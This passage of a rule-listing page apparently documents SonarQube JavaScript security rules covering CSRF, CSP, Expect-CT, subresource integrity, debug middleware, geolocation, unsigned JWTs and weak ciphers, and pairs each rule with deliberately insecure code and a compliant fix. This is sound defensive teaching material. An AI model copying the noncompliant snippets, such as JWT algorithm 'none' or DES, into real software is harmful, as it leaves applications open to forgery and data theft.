  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/434">CWE-434 - Unrestricted Upload of File with Dangerous Type</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a> - Unrestricted File
  Upload </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5742">
              javascript:S5742
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency">Certificate Transparency</a> (CT) is an open-framework to
protect against identity theft when certificates are issued. <a href="https://en.wikipedia.org/wiki/Certificate_authority">Certificate Authorities</a>
(CA) electronically sign certificate after verifying the identify of the certificate owner. Attackers use, among other things, social engineering
attacks to trick a CA to correctly verifying a spoofed identity/forged certificate.</p>
<p>CAs implement Certificate Transparency framework to publicly log the records of newly issued certificates, allowing the public and in particular
the identity owner to monitor these logs to verify that his identify was not usurped.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The website identity is valuable and well-known, therefore prone to theft. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT">Expect-CT</a> HTTP header which instructs the web browser
to check <a href="https://www.certificate-transparency.org/known-logs">public CT logs</a> in order to verify if the website appears inside and if it
is not, the browser will block the request and display a warning to the user.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/expect-ct">expect-ct</a> middleware is disabled:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
    helmet({
      expectCt: false // Sensitive
    })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application the <a href="https://www.npmjs.com/package/expect-ct">expect-ct</a> middleware is the standard way to implement
expect-ct. Usually, the deployment of this policy starts with the report only mode (<code>enforce: false</code>) and with a low <code>maxAge</code>
(the number of seconds the policy will apply) value and next if everything works well it is recommended to block future connections that violate
Expect-CT policy (<code>enforce: true</code>) and greater value for maxAge directive:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(helmet.expectCt({
  enforce: true,
  maxAge: 86400
})); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency">developer.mozilla.org</a> - Certificate Transparency
  </li>
  <li> <a href="https://en.wikipedia.org/wiki/Certificate_authority">wikipedia.org</a> - Certificate Authority </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4502">
              javascript:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses cookies to authenticate users. </li>
  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>
  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Protection against CSRF attacks is strongly recommended:
    <ul>
      <li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">unsafe HTTP
      methods</a>. </li>
      <li> implemented, for example, with an unguessable CSRF token </li>
    </ul>  </li>
  <li> Of course all sensitive operations should not be performed with <a
  href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/csurf">Express.js CSURF middleware</a> protection is not found on an unsafe HTTP method like POST
method:</p>
<pre>
let csrf = require('csurf');
let express = require('express');

let csrfProtection = csrf({ cookie: true });

let app = express();

// Sensitive: this operation doesn't look like protected by CSURF middleware (csrfProtection is not used)
app.post('/money_transfer', parseForm, function (req, res) {
  res.send('Money transferred');
});
</pre>
<p>Protection provided by <a href="https://www.npmjs.com/package/csurf">Express.js CSURF middleware</a> is globally disabled on unsafe methods:</p>
<pre>
let csrf = require('csurf');
let express = require('express');

app.use(csrf({ cookie: true, ignoreMethods: ["POST", "GET"] })); // Sensitive as POST is unsafe method
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/csurf">Express.js CSURF middleware</a> protection is used on unsafe methods:</p>
<pre>
let csrf = require('csurf');
let express = require('express');

let csrfProtection = csrf({ cookie:  true });

let app = express();

app.post('/money_transfer', parseForm, csrfProtection, function (req, res) { // Compliant
  res.send('Money transferred')
});
</pre>
<p>Protection provided by <a href="https://www.npmjs.com/package/csurf">Express.js CSURF middleware</a> is enabled on unsafe methods:</p>
<pre>
let csrf = require('csurf');
let express = require('express');

app.use(csrf({ cookie: true, ignoreMethods: ["GET"] })); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/352">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4507">
              javascript:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/errorhandler">errorhandler Express.js middleware</a> should not be used in production:</p>
<pre>
const express = require('express');
const errorhandler = require('errorhandler');

let app = express();
app.use(errorhandler()); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/errorhandler">errorhandler Express.js middleware</a> used only in development mode:</p>
<pre>
const express = require('express');
const errorhandler = require('errorhandler');

let app = express();

if (process.env.NODE_ENV === 'development') {
  app.use(errorhandler());
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/215">CWE-215 - Information Exposure Through Debug Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5604">
              javascript:S5604
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://www.w3.org/TR/permissions/#powerful-feature">Powerful features</a> are browser features (geolocation, camera, microphone …​) that
can be accessed with JavaScript API and may require a permission granted by the user. These features can have a high impact on privacy and user
security thus they should only be used if they are really necessary to implement the critical parts of an application.</p>
<p>This rule highlights intrusive permissions when requested with <a href="https://developer.mozilla.org/en-US/docs/Web/API/Permissions/query">the
future standard (but currently experimental) web browser query API</a> and specific APIs related to the permission. It is highly recommended to
customize this rule with the permissions considered as intrusive in the context of the web application.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some powerful features used by the application are not really necessary. </li>
  <li> Users are not clearly informed why and when powerful features are used by the application. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In order to respect user privacy it is recommended to avoid using intrusive powerful features. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>When using <a href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API">geolocation API</a>, Firefox for example retrieves personal
information like nearby wireless access points and IP address and sends it to the default geolocation service provider, <a
href="https://www.google.com/privacy/lsf.html">Google Location Services</a>:</p>
<pre>
navigator.permissions.query({name:"geolocation"}).then(function(result) {
});  // Sensitive: geolocation is a powerful feature with high privacy concerns

navigator.geolocation.getCurrentPosition(function(position) {
  console.log("coordinates x="+position.coords.latitude+" and y="+position.coords.longitude);
}); // Sensitive: geolocation is a powerful feature with high privacy concerns
</pre>
<h2>Compliant Solution</h2>
<p>If geolocation is required, always explain to the user why the application needs it and prefer requesting an approximate location when
possible:</p>
<pre>
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;
        Retailer website example
    &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    Type a city, street or zip code where you want to retrieve the closest retail locations of our products:
    &lt;form method=post&gt;
        &lt;input type=text value="New York"&gt; &lt;!-- Compliant --&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Web Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/250">CWE-250 - Execution with Unnecessary Privileges</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/359">CWE-359 - Exposure of Private Information</a> </li>
  <li> <a href="https://www.w3.org/TR/permissions/">W3C</a> - Permissions </li>
  <li> <a href="https://support.mozilla.org/en-US/kb/does-firefox-share-my-location-websites">Mozilla</a> - Does Firefox share my location with
  websites? </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5725">
              javascript:S5725
            </a>
          </td>
          <td>
            <details>
              <p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>
<p>On the client side, where front-end code is executed, malicious code could:</p>
<ul>
  <li> impersonate users' identities and take advantage of their privileges on the application. </li>
  <li> add quiet malware that monitors users' session and capture sensitive secrets. </li>
  <li> gain access to sensitive clients' personal data. </li>
  <li> deface, or otherwise affect the general availability of the application. </li>
  <li> mine cryptocurrencies in the background. </li>
</ul>
<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For
example, server-side malware could:</p>
<ul>
  <li> access and modify sensitive technical and business data. </li>
  <li> elevate its privileges on the underlying operating system. </li>
  <li> Use the compromised application as a pivot to attack the local network. </li>
</ul>
<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes
applied to it before it is downloaded.<br> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication
website or that was legitimately changed by its author, in a more benign scenario.</p>
<p>Important note: downloading an artifact over HTTPS only protects it while in transit from one host to another. It provides authenticity and
integrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The artifact is a file intended to execute code. </li>
  <li> The artifact is a file that is intended to configure or affect running code in some way. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified
since the fingerprint was computed.</p>
<p>In this case, the artifact’s hash must:</p>
<ul>
  <li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li>
  <li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li>
</ul>
<p>To do so, the best option is to add the hash in the code explicitly, by following <a
href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes">Mozilla’s official documentation on
how to generate integrity strings</a>.</p>
<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named "latest" or similar, so that the
front-end pages do not break when the code of the latest remote artifact changes.</strong></p>
<h2>Sensitive Code Example</h2>
<p>The following code sample uses neither integrity checks nor version pinning:</p>
<pre>
let script = document.createElement("script");
script.src = "https://cdn.example.com/latest/script.js"; // Sensitive
script.crossOrigin = "anonymous";
document.head.appendChild(script);
</pre>
<h2>Compliant Solution</h2>
<pre>
let script = document.createElement("script");
script.src = "https://cdn.example.com/v5.3.6/script.js";
script.integrity = "sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC";
script.crossOrigin = "anonymous";
document.head.appendChild(script);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/353">CWE-353 - Missing Support for Integrity Check</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">developer.mozilla.org</a> - Subresource Integrity </li>
  <li> <a href="https://en.wikipedia.org/wiki/Watering_hole_attack">Wikipedia, Watering Hole Attacks</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5728">
              javascript:S5728
            </a>
          </td>
          <td>
            <details>
              <p>Content security policy (CSP) (fetch directives) is a <a href="https://www.w3.org/TR/CSP3/">W3C standard </a> which is used by a server to specify,
via a http header, the origins from where the browser is allowed to load resources. It can help to mitigate the risk of cross site scripting (XSS)
attacks and reduce privileges used by an application. If the website doesn’t define CSP header the browser will apply <a
href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">same-origin policy</a> by default.</p>
<pre>
Content-Security-Policy: default-src 'self'; script-src ‘self ‘ http://www.example.com
</pre>
<p>In the above example, all resources are allowed from the website where this header is set and script resources fetched from example.com are also
authorized:</p>
<pre>
&lt;img src="selfhostedimage.png&gt;&lt;/script&gt; &lt;!-- will be loaded because default-src 'self'; directive is applied  --&gt;
&lt;img src="http://www.example.com/image.png&gt;&lt;/script&gt;  &lt;!-- will NOT be loaded because default-src 'self'; directive is applied  --&gt;
&lt;script src="http://www.example.com/library.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;
&lt;script src="selfhostedscript.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.com directive is applied  --&gt;
&lt;script src="http://www.otherexample.com/library.js&gt;&lt;/script&gt; &lt;!-- will NOT be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The resources of the application are fetched from various untrusted locations. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy fetch directives, in particular <em>default-src</em> directive and continue to properly sanitize and validate all
inputs of the application, indeed CSP fetch directives is only a tool to reduce the impact of cross site scripting attacks.</p>
<h2>Sensitive Code Example</h2>
<p>In a Express.js application, the code is sensitive if the <a href="https://www.npmjs.com/package/helmet">helmet</a> contentSecurityPolicy
middleware is disabled:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();
app.use(
    helmet({
      contentSecurityPolicy: false, // sensitive
    })
);
</pre>
<h2>Compliant Solution</h2>
<p>In a Express.js application, a standard way to implement CSP is the <a href="https://www.npmjs.com/package/helmet">helmet contentSecurityPolicy
middleware</a>:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();
app.use(helmet.contentSecurityPolicy()); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://www.w3.org/TR/CSP3/">w3.org</a> - Content Security Policy Level 3 </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org</a> - Content Security Policy (CSP) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5659">
              javascript:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in jsonwebtoken</h2>
<h3>Code examples</h3>
<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const jwt = require('jsonwebtoken');

jwt.sign(payload, key, { algorithm: 'none' }); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const jwt = require('jsonwebtoken');

jwt.verify(token, key, {
    expiresIn: 360000,
    algorithms: ['none'] // Noncompliant
}, callbackcheck);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const jwt = require('jsonwebtoken');

jwt.sign(payload, key, { algorithm: 'HS256' });
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const jwt = require('jsonwebtoken');

jwt.verify(token, key, {
    expiresIn: 360000,
    algorithms: ['HS256']
}, callbackcheck);
</pre>
<h3>How does this work?</h3>
<h4>Always sign your tokens</h4>
<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can
tamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a
signing function, and using it is usually as simple as providing a secret key when the token is created.</p>
<h4>Choose a strong cipher algorithm</h4>
<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are
considered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),
which uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be
able to forge tokens.</p>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue, follow these instructions:</p>
<ol>
  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>
  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for
  further investigation. </li>
  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>
</ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/347">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5547">
              javascript:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto = require('crypto');

crypto.createCipheriv("DES", key, iv); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto = require('crypto');

crypto.createCipheriv("AES-256-GCM", key, iv);
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5542">
              javascript:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto = require('crypto');

crypto.createCipheriv("AES-128-CBC", key, iv); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto = require('crypto');

crypto.createCipheriv("AES-256-GCM", key, iv);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
